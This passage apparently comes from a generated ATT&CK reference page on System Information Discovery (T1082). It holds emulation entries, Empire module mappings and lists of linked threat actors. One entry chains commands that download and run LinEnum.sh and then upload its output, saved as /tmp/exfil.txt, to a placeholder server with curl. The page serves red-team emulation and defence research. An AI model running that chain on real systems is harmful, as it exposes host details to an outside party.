                                                                                                  'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
                                                                                                  'chmod '
                                                                                                  '+x '
                                                                                                  'LinEnum.sh;\n'
                                                                                                  './LinEnum.sh '
                                                                                                  '> '
                                                                                                  '/tmp/exfil.txt;\n'
                                                                                                  'curl '
                                                                                                  '-F '
                                                                                                  "'data=@/tmp/exfil.txt' "
                                                                                                  '#{server}/file/upload '
                                                                                                  ';\n'
                                                                                                  'cat '
                                                                                                  '/tmp/exfil.txt;\n'}}},
                                                        'tactic': 'discovery',
                                                        'technique': {'attack_id': 'T1082',
                                                                      'name': 'System '
                                                                              'Information '
                                                                              'Discovery'}}},
 {'Mitre Stockpile - Find OS Version': {'description': 'Find OS Version',
                                        'id': 'b6b105b9-41dc-490b-bc5c-80d699b82ce8',
                                        'name': 'Find OS Version',
                                        'platforms': {'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}},
                                        'tactic': 'discovery',
                                        'technique': {'attack_id': 'T1082',
                                                      'name': 'System '
                                                              'Information '
                                                              'Discovery'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': 'T1005',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/host/computerdetails":  '
                                                                                 '["T1082","T1005"],',
                                            'Empire Module': 'powershell/situational_awareness/host/computerdetails',
                                            'Technique': 'System Information '
                                                         'Discovery'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/host/winenum":  '
                                                                                 '["T1082"],',
                                            'Empire Module': 'powershell/situational_awareness/host/winenum',
                                            'Technique': 'System Information '
                                                         'Discovery'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1082',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/powerview/get_computer":  '
                                                                                 '["T1082"],',
                                            'Empire Module': 'powershell/situational_awareness/network/powerview/get_computer',
                                            'Technique': 'System Information '
                                                         'Discovery'}}]
```

# Tactics


* [Discovery](../tactics/Discovery.md)


# Mitigations


* [System Information Discovery Mitigation](../mitigations/System-Information-Discovery-Mitigation.md)


# Actors


* [Patchwork](../actors/Patchwork.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [APT37](../actors/APT37.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [APT19](../actors/APT19.md)
    
* [admin@338](../actors/admin@338.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Turla](../actors/Turla.md)
    
* [APT32](../actors/APT32.md)
    
* [APT3](../actors/APT3.md)
    
* [Sowbug](../actors/Sowbug.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT18](../actors/APT18.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [Inception](../actors/Inception.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
* [Rocke](../actors/Rocke.md)
    
